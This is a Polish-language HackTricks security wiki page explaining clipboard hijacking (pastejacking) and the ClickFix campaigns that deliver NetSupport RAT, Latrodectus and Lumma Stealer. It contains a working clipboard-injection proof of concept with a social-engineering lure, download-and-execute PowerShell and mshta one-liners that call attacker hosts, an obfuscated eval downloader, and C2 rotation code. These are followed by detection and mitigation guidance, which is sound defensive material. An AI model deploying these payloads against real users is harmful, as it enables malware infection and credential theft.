# Clipboard Hijacking (Pastejacking) Ataki

{{#include ../../banners/hacktricks-training.md}}

> "Nigdy nie wklejaj niczego, czego sam(a) nie skopiowałeś(-aś)." – stare, ale nadal słuszne zalecenie

## Przegląd

Clipboard hijacking – also known as *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia bez ich sprawdzenia. Złośliwa strona WWW (lub dowolny kontekst z obsługą JavaScript, taki jak Electron lub aplikacja desktopowa) programowo umieszcza tekst kontrolowany przez atakującego w systemowym schowku. Ofiary są zachęcane, zwykle przez starannie skonstruowane instrukcje social-engineering, aby wcisnąć **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), lub otworzyć terminal i *wkleić* zawartość schowka, natychmiast wykonując dowolne polecenia.

Ponieważ **żaden plik nie jest pobierany i żaden załącznik nie jest otwierany**, technika omija większość kontroli bezpieczeństwa poczty e-mail i treści webowych, które monitorują załączniki, macros lub bezpośrednie wykonywanie poleceń. Atak jest dlatego popularny w kampaniach phishingowych dostarczających powszechne rodziny malware, takie jak NetSupport RAT, Latrodectus loader lub Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## Przebieg ClickFix / ClearFake

1. Użytkownik odwiedza typosquatted lub skompromitowaną stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty JavaScript **ClearFake** wywołuje helper `unsecuredCopyToClipboard()`, który w tle zapisuje w schowku Base64-encoded PowerShell one-liner.
3. Instrukcje HTML każą ofierze: *“Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. `powershell.exe` uruchamia się, pobierając archiwum zawierające legalny plik wykonywalny oraz złośliwy DLL (classic DLL sideloading).
5. Loader odszyfrowuje dodatkowe etapy, wstrzykuje shellcode i instaluje persistence (np. scheduled task) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.

### Przykładowy łańcuch NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (prawidłowy Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwy plik DLL dynamicznie rozwiązuje API przy użyciu **GetProcAddress**, pobiera dwa pliki binarne (`data_3.bin`, `data_4.bin`) za pomocą **curl.exe**, odszyfrowuje je przy użyciu rolling XOR key `"https://google.com/"`, wstrzykuje finalny shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` przy użyciu **curl.exe**
2. Uruchamia JScript downloader w **cscript.exe**
3. Pobiera MSI payload → umieszcza `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer przez MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Wywołanie **mshta** uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wypakowuje `Boat.pst` (CAB), odtwarza `AutoIt3.exe` za pomocą `extrac32` i łączenia plików, a na końcu uruchamia skrypt `.a3x`, który eksfiltrowuje poświadczenia przeglądarki do `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i instruują ofiary, aby wkleiły jednowierszowy kod, który pobiera i wykonuje JavaScript za pomocą WSH, utrwala go i codziennie zmienia C2. Przykład zaobserwowanego łańcucha:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Key traits
- Zamaskowany URL odwracany podczas wykonywania, by utrudnić powierzchowną inspekcję.
- JavaScript zachowuje trwałość poprzez Startup LNK (WScript/CScript) i wybiera C2 według bieżącego dnia – umożliwiając szybką rotację domen.

Minimal JS fragment used to rotate C2s by date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Następny etap zazwyczaj wdraża loader, który ustanawia trwałość i pobiera RAT (np. PureHVNC), często przypinając TLS do twardo zakodowanego certyfikatu i dzieląc ruch na kawałki.

Detection ideas specific to this variant
- Drzewo procesów: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Artefakty autostartu: LNK w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wywołujący WScript/CScript z ścieżką JS pod `%TEMP%`/`%APPDATA%`.
- Rejestr/RunMRU i telemetria linii poleceń zawierająca `.split('').reverse().join('')` lub `eval(a.responseText)`.
- Powtarzające się `powershell -NoProfile -NonInteractive -Command -` z dużymi payloadami na stdin do zasilania długich skryptów bez długich linii poleceń.
- Zaplanowane zadania, które następnie uruchamiają LOLBins takie jak `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` w zadaniu/ścieżce wyglądającej na updater (np. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Koreluj zdarzenia zapisu do schowka, po których następuje wklejenie Win+R, a następnie natychmiastowe uruchomienie `powershell.exe`.

Blue-teams mogą łączyć telemetrię schowka, tworzenia procesów i rejestru, aby namierzyć nadużycia pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukaj nietypowych wpisów Base64 / zaciemnionych.
* Security Event ID **4688** (Process Creation), gdzie `ParentImage` == `explorer.exe` i `NewProcessName` w { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** dla tworzenia plików pod `%LocalAppData%\Microsoft\Windows\WinX\` lub w folderach tymczasowych tuż przed podejrzanym zdarzeniem 4688.
* EDR clipboard sensors (if present) – koreluj `Clipboard Write` następujący bezpośrednio po uruchomieniu nowego procesu PowerShell.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
